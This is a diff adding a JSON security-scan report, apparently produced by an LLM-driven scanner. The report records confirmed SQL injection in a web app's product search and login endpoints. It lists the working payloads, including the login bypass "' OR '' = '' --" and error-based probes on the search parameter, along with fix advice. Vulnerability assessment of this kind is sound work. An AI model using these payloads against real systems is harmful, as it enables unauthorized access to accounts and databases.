@@ -1,0 +1,138 @@
+{
+  "generated_at": "2026-06-25T17:38:46.458584+00:00",
+  "scan_results_file": "scan_results.json",
+  "agent_results_file": "agent_results.json",
+  "report_input_summary": {
+    "scan_target_count": 6,
+    "agent_target_count": 6,
+    "input_mode": "compacted_scan_and_probe_evidence"
+  },
+  "report": {
+    "overall_status": "vulnerabilities_found",
+    "executive_summary": "SQL injection vulnerabilities were identified from local probe evidence.",
+    "findings": [
+      {
+        "title": "SQL Injection in /rest/products/search",
+        "severity": "critical",
+        "confidence": 0.9,
+        "method": "GET",
+        "path": "/rest/products/search",
+        "endpoint_type": "search",
+        "attack_style": "string_search_error_probe",
+        "parameter": "q",
+        "payload": " OR 'a'='a",
+        "evidence": "Probe response exposed SQLITE_ERROR.",
+        "recommendation": "Use parameterized queries, avoid string-built SQL, and validate inputs server-side."
+      },
+      {
+        "title": "SQL Injection in /rest/user/login",
+        "severity": "critical",
+        "confidence": 0.9,
+        "method": "POST",
+        "path": "/rest/user/login",
+        "endpoint_type": "auth_login",
+        "attack_style": "auth_boolean_bypass",
+        "parameter": "email",
+        "payload": "' OR '' = '' --",
+        "evidence": "Baseline login failed with 401, while probe returned 200 with authentication data.",
+        "recommendation": "Use parameterized queries, avoid string-built SQL, and validate inputs server-side."
+      }
+    ],
+    "not_decidable_targets": [
+      {
+        "method": "GET",
+        "path": "/api/Challenges",
+        "parameter": "key",
+        "reason": "Probe response did not expose a SQL parser/database error."
+      },
+      {
+        "method": "GET",
+        "path": "/rest/user/whoami",
+        "parameter": "fields",
+        "reason": "Probe response did not expose a SQL parser/database error."
+      }
+    ],
+    "report_generation": {
+      "mode": "llm",
+      "provider": "nvidia",
+      "model": "meta/llama-3.1-8b-instruct",
+      "input": "compacted_scan_and_probe_evidence",
+      "evidence_filter": "Removed 2 unsupported finding(s) that lacked local probe evidence."
+    },
+    "capability_summary": {
+      "confirmed_surface_count": 2,
+      "confirmed_techniques": [
+        "authentication_bypass",
+        "error_based_sqli"
+      ],
+      "dbms_hints": [
+        "sqlite"
+      ],
+      "confirmed_surfaces": [
+        {
+          "method": "GET",
+          "path": "/rest/products/search",
+          "parameter": "q",
+          "endpoint_type": "search",
+          "technique": "error_based_sqli",
+          "payload": " OR 'a'='a"
+        },
+        {
+          "method": "GET",
+          "path": "/rest/products/search",
+          "parameter": "q",
+          "endpoint_type": "search",
+          "technique": "error_based_sqli",
+          "payload": " OR 'a'='b"
+        },
+        {
+          "method": "GET",
+          "path": "/rest/products/search",
+          "parameter": "q",
+          "endpoint_type": "search",
+          "technique": "error_based_sqli",
+          "payload": " OR 'a'='c"
+        },
+        {
+          "method": "GET",
+          "path": "/rest/products/search",
+          "parameter": "q",
+          "endpoint_type": "search",
+          "technique": "error_based_sqli",
+          "payload": " OR 'a'='d"
+        },
+        {
+          "method": "GET",
+          "path": "/rest/products/search",
+          "parameter": "q",
+          "endpoint_type": "search",
+          "technique": "error_based_sqli",
+          "payload": " OR 'a'='e"
+        },
+        {
+          "method": "GET",
+          "path": "/rest/products/search",
+          "parameter": "q",
+          "endpoint_type": "search",
+          "technique": "error_based_sqli",
+          "payload": " OR 'a'='g"
+        },
+        {
+          "method": "POST",
+          "path": "/rest/user/login",
+          "parameter": "email",
+          "endpoint_type": "auth_login",
+          "technique": "authentication_bypass",
+          "payload": "' OR '' = '' --"
+        }
+      ],
+      "potential_impacts": [
+        "authentication logic can be bypassed for the affected endpoint",
+        "database query structure is influenced by user input"
+      ],
+      "unverified_capabilities": [
+        "non-sensitive in-band read confirmation was not proven"
+      ]
+    }
+  }
+}
